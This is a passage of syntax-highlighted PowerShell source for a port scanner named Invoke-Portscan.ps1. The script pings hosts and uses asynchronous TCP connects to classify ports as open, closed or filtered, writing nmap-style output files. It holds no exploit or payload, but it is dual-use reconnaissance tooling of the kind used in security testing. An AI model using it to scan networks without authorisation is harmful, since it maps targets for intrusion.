class="hljs-string">&quot;.gnmap&quot;</span><br>                <span class="hljs-variable">$XmlOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.xml&quot;</span><br>                <span class="hljs-variable">$ReadableOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.nmap&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$GrepOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$AllformatsOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$grepStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$GrepOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ReadableOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$ReadableOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$ReadableOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$readableStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$ReadableOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XmlOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$XmlOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$XmlOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br><br>                <span class="hljs-variable">$xmlStream</span> =   [<span class="hljs-type">System.xml.xmlwriter</span>]::Create([<span class="hljs-built_in">string</span>]<span class="hljs-variable">$XmlOut</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartDocument()<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Portscanrun&quot;</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-variable">$version</span>)<br><br>            &#125;<br><br>            Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$DiscoveryPorts</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$hostPortList</span> | <span class="hljs-built_in">Out-Null</span><br><br>            <span class="hljs-variable">$startdate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$myInvocationLine</span> = <span class="hljs-variable">$PSCmdlet</span>.MyInvocation.Line<br>            <span class="hljs-variable">$startMsg</span> = <span class="hljs-string">&quot;Invoke-Portscan.ps1 v<span class="hljs-variable">$version</span> scan initiated <span class="hljs-variable">$startdate</span> as: <span class="hljs-variable">$myInvocationLine</span>&quot;</span><br><br>            <span class="hljs-comment">#TODO deal with output</span><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-comment"># #converting back from int array gives some argument error checking</span><br>            <span class="hljs-comment"># $sPortList = [string]::join(&quot;,&quot;, $portList)</span><br>            <span class="hljs-comment"># $sHostPortList = [string]::join(&quot;,&quot;, $hostPortList)</span><br><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-comment">#Port Scan Code - run on a per host basis</span><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-variable">$portScanCode</span> = &#123;<br>                <span class="hljs-keyword">param</span> (<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$thost</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$PortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$hostPortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$maxthreads</span>)<br>                <span class="hljs-keyword">Process</span><br>                &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$closedPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>                <span class="hljs-variable">$sockets</span> = <span class="hljs-selector-tag">@</span>&#123;&#125;<br>                <span class="hljs-variable">$timeouts</span> = <span class="hljs-built_in">New-Object</span> Hashtable<br><br>                <span class="hljs-comment">#set maximum $async threads</span><br>                <span class="hljs-variable">$fThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                <span class="hljs-variable">$aThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::GetMaxThreads([<span class="hljs-type">ref</span>]<span class="hljs-variable">$fThreads</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$aThreads</span>) | <span class="hljs-built_in">Out-Null</span><br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::SetMaxThreads(<span class="hljs-variable">$fthreads</span>,<span class="hljs-variable">$maxthreads</span>) | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">New-ScriptBlockCallback</span></span> &#123;<br>                    <span class="hljs-keyword">param</span>(<br>                        [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<br>                        [<span class="hljs-type">ValidateNotNullOrEmpty</span>()]<br>                        [<span class="hljs-type">scriptblock</span>]<span class="hljs-variable">$Callback</span><br>                    )<br><br>                    <span class="hljs-comment">#taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-string">&quot;CallbackEventBridge&quot;</span> <span class="hljs-operator">-as</span> [<span class="hljs-type">type</span>])) &#123;<br>                        <span class="hljs-built_in">Add-Type</span> <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                            using System;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            public sealed class CallbackEventBridge</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                public event AsyncCallback CallbackComplete = delegate &#123; &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private CallbackEventBridge() &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private void CallbackInternal(IAsyncResult result)</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    CallbackComplete(result);</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public AsyncCallback Callback</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    get &#123; return new AsyncCallback(CallbackInternal); &#125;</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public static CallbackEventBridge Create()</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    return new CallbackEventBridge();</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$bridge</span> = [<span class="hljs-type">CallbackEventBridge</span>]::Create()<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$bridge</span> <span class="hljs-literal">-EventName</span> CallbackComplete <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Callback</span> | <span class="hljs-built_in">Out-Null</span><br><br>                    <span class="hljs-variable">$bridge</span>.Callback<br><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Test-Port</span></span> &#123;<br><br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$p</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$timeout</span><br>                    )<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-variable">$pAddress</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$h</span>)<br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient <span class="hljs-variable">$pAddress</span>.AddressFamily<br><br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> &#123;<br>                        <span class="hljs-comment">#we&#x27;re assuming this is a host name</span><br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient<br>                    &#125;<br><br>                    <span class="hljs-variable">$scriptBlockAsString</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        #somewhat of a race condition with the timeout, but I don&#x27;t think it matters</span><br><span class="hljs-string">                        if ( `$sockets[<span class="hljs-variable">$p</span>] -ne `$NULL)</span><br><span class="hljs-string">                        &#123;</span><br><span class="hljs-string">                            if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                                `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$status = `$sockets[<span class="hljs-variable">$p</span>].Connected;</span><br><span class="hljs-string">                            if (`$status -eq `$True)</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is open&quot;</span><br><span class="hljs-string">                                `$openPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            else</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is closed&quot;</span><br><span class="hljs-string">                                `$closedPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            `$sockets[<span class="hljs-variable">$p</span>].Close();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    <span class="hljs-variable">$timeoutCallback</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                        #write-host &quot;<span class="hljs-variable">$p</span> is filtered&quot;</span><br><span class="hljs-string">                        `$sockets[<span class="hljs-variable">$p</span>].Close()</span><br><span class="hljs-string">                        if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                            `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            `$filteredPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">                        `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">&quot;@</span><br><br>                    <span class="hljs-variable">$timeoutCallback</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$timeoutCallback</span>)<br><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">New-Object</span> System.Timers.Timer<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] <span class="hljs-literal">-EventName</span> Elapsed <span class="hljs-literal">-Action</span> <span class="hljs-variable">$timeoutCallback</span> | <span class="hljs-built_in">Out-Null</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Interval = <span class="hljs-variable">$timeout</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Enabled = <span class="hljs-variable">$true</span><br><br>                    <span class="hljs-variable">$myscriptblock</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$scriptBlockAsString</span>)<br>                    <span class="hljs-variable">$Null</span> = <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>].beginConnect(<span class="hljs-variable">$h</span>, <span class="hljs-variable">$p</span>,(<span class="hljs-built_in">New-ScriptBlockCallback</span>(<span class="hljs-variable">$myscriptblock</span>)) , <span class="hljs-variable">$null</span>)<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PortScan-Alive</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    <span class="hljs-keyword">Try</span><br>                    &#123;<br><br>                        <span class="hljs-comment">#ping</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hostPortList</span>.Contains(<span class="hljs-literal">-1</span>))<br>                        &#123;<br>                            <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">new-object</span> System.Net.NetworkInformation.Ping<br>                            <span class="hljs-variable">$pResult</span> = <span class="hljs-variable">$ping</span>.send(<span class="hljs-variable">$h</span>)<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pResult</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>)<br>                            &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostPortList</span>)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Port</span> <span class="hljs-operator">-ne</span> <span class="hljs-literal">-1</span>)<br>                            &#123;<br>                                <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">do</span> &#123;<br>                            <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">100</span><br>                            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$openPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$closedPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)) &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">While</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)<br><br>                    &#125;<br>                    <span class="hljs-keyword">Catch</span><br>                    &#123;<br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to host scan <span class="hljs-variable">$h</span>&quot;</span><br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Portscan-Port</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    [<span class="hljs-built_in">string</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>()<br><br>                    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Portlist</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">Try</span><br>                        &#123;<br>                            <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                        &#125;<br>                        <span class="hljs-keyword">Catch</span><br>                        &#123;<br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to scan <span class="hljs-variable">$h</span> port <span class="hljs-variable">$Port</span>&quot;</span><br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = <span class="hljs-variable">$False</span><br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$SkipDiscovery</span>)<br>                &#123;<br>                    [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = PortScan<span class="hljs-literal">-Alive</span> <span class="hljs-variable">$thost</span><br>                    <span class="hljs-variable">$openPorts</span>.clear()<br>                    <span class="hljs-variable">$closedPorts</span>.clear()<br>                    <span class="hljs-variable">$filteredPorts</span>.Clear()<br>                &#125;<br>                <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$PingOnly</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$hostResult</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>))<br>                &#123;<br>                    Portscan<span class="hljs-literal">-Port</span> <span class="hljs-variable">$thost</span><br>                &#125;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">500</span><br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$hostResult</span>, <span class="hljs-variable">$openPorts</span>, <span class="hljs-variable">$closedPorts</span>, <span class="hljs-variable">$filteredPorts</span>)<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment"># the outer loop is to flush the loop.</span><br>            <span class="hljs-comment"># Otherwise Get-Job | Wait-Job could clog, etc</span><br><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$saveIteration</span> = <span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$computersDone</span>=<span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$upHosts</span>=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$saveIteration</span> * <span class="hljs-variable">$SyncFreq</span>) <span class="hljs-operator">-lt</span> <span class="hljs-variable">$hostList</span>.Count)<br>            &#123;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Remove-Job</span> <span class="hljs-literal">-Force</span><br>                <span class="hljs-variable">$sIndex</span> = (<span class="hljs-variable">$saveIteration</span>*<span class="hljs-variable">$SyncFreq</span>)<br>                <span class="hljs-variable">$eIndex</span> = ((<span class="hljs-variable">$saveIteration</span>+<span class="hljs-number">1</span>)*<span class="hljs-variable">$SyncFreq</span>)<span class="hljs-literal">-1</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostList</span>[<span class="hljs-variable">$sIndex</span><span class="hljs-type">..</span><span class="hljs-variable">$eIndex</span>])<br>                &#123;<br>                    <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$ctr</span>.Count <span class="hljs-operator">-ge</span> <span class="hljs-variable">$nHosts</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milliseconds</span> <span class="hljs-variable">$SleepTimer</span><br>                        <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    &#125;<br><br>                    <span class="hljs-variable">$computersDone</span>++<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$noProgressMeter</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Write-Progress</span> <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;Port Scanning&quot;</span> <span class="hljs-literal">-Activity</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-CurrentOperation</span> <span class="hljs-string">&quot;starting computer <span class="hljs-variable">$computersDone</span>&quot;</span>  <span class="hljs-literal">-PercentComplete</span> (<span class="hljs-variable">$computersDone</span> / <span class="hljs-variable">$hostList</span>.Count * <span class="hljs-number">100</span>)<br>                    &#125;<br><br>                    <span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> <span class="hljs-variable">$portScanCode</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$iHost</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$iHost</span>, <span class="hljs-variable">$SkipDiscovery</span>, <span class="hljs-variable">$PingOnly</span>, <span class="hljs-variable">$Timeout</span>, <span class="hljs-variable">$portList</span>, <span class="hljs-variable">$hostPortList</span>, <span class="hljs-variable">$Threads</span>)  | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Wait-Job</span> | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$job</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-Job</span>)<br>                &#123;<br>                    <span class="hljs-variable">$jobOut</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Receive-Job</span> <span class="hljs-variable">$job</span>)<br>                    [<span class="hljs-built_in">bool</span>]<span class="hljs-variable">$hostUp</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">0</span>]<br>                    <span class="hljs-variable">$jobName</span> = <span class="hljs-variable">$job</span>.Name<br><br>                    <span class="hljs-variable">$openPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">1</span>]<br>                    <span class="hljs-variable">$closedPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">2</span>]<br>                    <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-variable">$jobOut</span><span class="hljs-function">[<span class="hljs-number">3</span>]</span><br><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hostUp</span>) &#123;<br>                        <span class="hljs-variable">$upHosts</span> ++<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$quiet</span>)<br>                    &#123;<br>                        <span class="hljs-variable">$hostDate</span> = <span class="hljs-built_in">Get-Date</span><br>                        <span class="hljs-variable">$hostObj</span> = <span class="hljs-built_in">New-Object</span> System.Object<br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> Hostname <span class="hljs-literal">-Value</span> <span class="hljs-variable">$jobName</span><br><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> alive <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostUp</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> openPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$openPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> closedPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$closedPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> filteredPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$filteredPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> NoteProperty <span class="hljs-literal">-Name</span> finishTime <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostDate</span><br><br>                        <span class="hljs-variable">$scannedHostList</span> += <span class="hljs-variable">$hostobj</span><br>                    &#125;<br><br>                    <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-outhost</span> <span class="hljs-variable">$jobName</span> <span class="hljs-literal">-isUp</span> <span class="hljs-variable">$hostUp</span> <span class="hljs-literal">-openPorts</span> <span class="hljs-variable">$openPorts</span> <span class="hljs-literal">-closedPorts</span> <span class="hljs-variable">$closedPorts</span> <span class="hljs-literal">-filteredPorts</span> <span class="hljs-variable">$filteredPorts</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span> <span class="hljs-literal">-SkipDiscovery</span> <span class="hljs-variable">$SkipDiscovery</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                    <span class="hljs-variable">$grepStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                    <span class="hljs-variable">$xmlStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                    <span class="hljs-variable">$readableStream</span>.flush()<br>                &#125;<br><br>                <span class="hljs-variable">$saveIteration</span> ++<br>            &#125;<br><br>            <span class="hljs-variable">$enddate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$totaltime</span> = (<span class="hljs-variable">$enddate</span> - <span class="hljs-variable">$startdate</span>).TotalSeconds<br>            <span class="hljs-variable">$endMsg</span> = <span class="hljs-string">&quot;Port scan complete at <span class="hljs-variable">$enddate</span> (<span class="hljs-variable">$totaltime</span> seconds)&quot;</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                <span class="hljs-variable">$endMsg</span> += <span class="hljs-string">&quot;, <span class="hljs-variable">$upHosts</span> hosts are up&quot;</span><br>            &#125;<br><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$endMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$grepStream</span>) &#123;<br>                <span class="hljs-variable">$grepStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                <span class="hljs-variable">$xmlStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                <span class="hljs-variable">$readableStream</span>.Close()<br>            &#125;<br><br>            <span 